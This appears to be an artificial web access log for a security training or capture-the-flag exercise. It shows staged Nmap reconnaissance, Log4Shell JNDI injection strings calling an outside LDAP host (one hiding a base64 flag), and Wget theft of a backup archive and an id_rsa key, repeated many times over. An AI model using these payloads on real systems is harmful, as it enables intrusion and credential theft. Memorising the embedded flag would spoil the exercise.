167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
